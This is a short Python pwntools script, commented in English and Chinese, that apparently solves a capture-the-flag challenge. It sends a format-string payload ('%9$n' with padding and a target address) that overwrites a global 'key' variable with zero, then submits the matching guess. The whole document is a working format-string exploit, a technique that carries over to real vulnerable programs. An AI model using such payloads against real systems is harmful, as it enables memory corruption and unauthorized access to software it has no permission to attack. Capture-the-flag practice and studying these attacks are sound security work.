from pwn import *

# 1. Environment Configuration / 环境配置
context.arch = 'amd64'
host = 'svtctf.m0lecon.it'
port = 13456

# 2. Establish Connection / 连接服务器
io = remote(host, port)

# 3. Construct Minimized Payload / 构造精简版 Payload
# target_addr: The global address of 'key' found in assembly (0x4040b0)
# target_addr: 汇编中找到的全局变量 'key' 的地址 (0x4040b0)
target_addr = 0x4040b0

# Payload Breakdown:
# - b"%9$n": Write the number of characters printed so far (0) to the address at the 9th offset.
# - b"AAAA": Padding to align the payload to 8-byte boundaries.
# - p64(target_addr): The actual address we want to overwrite.
#
# Payload 拆解:
# - b"%9$n": 将目前已打印的字符数 (0) 写入第 9 个参数指向的地址。
# - b"AAAA": 填充数据，用于将 Payload 对齐到 8 字节边界。
# - p64(target_addr): 我们想要篡改的实际目标地址。
payload = b"%9$n" + b"AAAA" + p64(target_addr)

# 4. Execute the Attack / 执行攻击
print("[*] Sending minimized payload (Index 9)...")
io.sendlineafter(b"what is your name:", payload)

# Since %n was at the very beginning, 0 characters were printed.
# Therefore, [0x4040b0] now contains 0.
# 因为 %n 放在开头，前面打印了 0 个字符。因此，[0x4040b0] 现在的值就是 0。
print("[*] Attempting to send guess: 0")
io.sendlineafter(b"guess the number:", b"0")

# 5. Capture the Result / 获取结果
print("[*] Results:")
io.interactive()